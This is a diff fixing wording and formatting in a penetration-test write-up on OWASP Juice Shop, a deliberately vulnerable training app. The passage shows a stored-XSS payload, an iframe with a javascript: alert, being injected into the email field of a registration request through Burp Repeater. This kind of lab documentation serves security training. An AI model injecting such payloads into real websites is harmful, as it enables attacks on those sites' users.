@@ -32,12 +32,12 @@ The objective of this penetration test in OWASP Juice Shop was to demonstrate a 
     "securityAnswer":"zaya"
 }
 ```
-5. Right-click inside the request and select `Send to Repeater klicken`. Then switch to the Repeater tab. Here we manipulate the JSON and insert our payload `<iframe src="javascript:alert('xss')">` into the `email` field:
+5. Right-click inside the request and select `Send to Repeater`. Then switch to the `Repeater` tab. Here we manipulate the JSON and insert our payload `<iframe src="javascript:alert('xss')">` into the `email` field:
 ``` JSON
 "email": "<iframe src='javascript:alert(`xss`)'>"
 ```
 
-6. Click Send. The response should confirm successful account creation:
+6. Click `Send`. The response should confirm successful account creation:
 ``` JSON
 HTTP/1.1 201 Created
 Access-Control-Allow-Origin: *
